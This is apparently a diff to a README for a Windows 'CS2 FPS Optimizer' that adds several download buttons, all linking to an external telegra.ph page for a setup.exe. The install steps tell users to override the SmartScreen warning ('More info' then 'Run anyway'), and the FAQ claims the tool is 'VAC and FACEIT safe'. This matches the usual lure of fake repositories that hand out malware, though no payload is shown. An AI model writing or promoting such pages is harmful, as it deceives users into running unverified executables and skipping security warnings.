@@ -16,12 +16,24 @@
 
 <p align="center">
   ⚡ <strong>Download the latest installer (setup.exe) below</strong> ⚡
-  <br><br>
+</p>
+
+<p align="center">
   <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download setup.exe">
   </a>
-  <br>
-  <span style="font-size:1.2em; font-weight:bold;">👉 <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10</a> 👈</span>
+</p>
+
+<p align="center">
+  <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-0078d4?style=for-the-badge&logo=googledrive&logoColor=white" alt="Download setup.exe">
+  </a>
+</p>
+
+<p align="center">
+  <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-1f6feb?style=for-the-badge&logo=github&logoColor=white" alt="Download setup.exe">
+  </a>
 </p>
 
 <p align="center">
@@ -46,8 +58,7 @@
 
 ## 🚀 Quick Install
 
-1. **Click the green download button above** or use this direct link:  
-   👉 **[Download setup.exe](https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10)**  
+1. **Click any download button above**  
 2. Run `setup.exe` (Windows SmartScreen may appear – click *"More info"* then *"Run anyway"*)  
 3. Follow the installer – it will place **ProjectFiles** in `%ProgramFiles%\CS2FPSOptimizer`  
 4. Launch from Start Menu or Desktop shortcut  
@@ -78,7 +89,7 @@
 ## ❓ FAQ
 
 **Q:** Is this safe for CS2?  
-**A:** Yes – it only modifies standard Windows settings, not CS2 game files. VAC and FACEIT safe [citation:3].  
+**A:** Yes – it only modifies standard Windows settings, not CS2 game files. VAC and FACEIT safe.  
 
 **Q:** Does it work with other games?  
 **A:** The optimizer is tuned for CS2 but the system tweaks benefit most competitive titles.  
@@ -94,20 +105,17 @@ MIT – free to use, modify, and distribute.
 
 ---
 
-## 🔗 Download Again
+<p align="center">
+  <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download setup.exe">
+  </a>
+</p>
 
 <p align="center">
   <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-0078d4?style=for-the-badge&logo=googledrive&logoColor=white" alt="Download setup.exe">
   </a>
 </p>
-
-<p align="center">
-  <strong>Direct link (clickable):</strong><br>
-  <a href="https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10">https://telegra.ph/HOW-TO-DOWNLOAD-09-15-10</a>
-</p>
-
----
 
 <p align="center">
   <sub>Built for Windows 10/11 – 2026 Edition</sub>
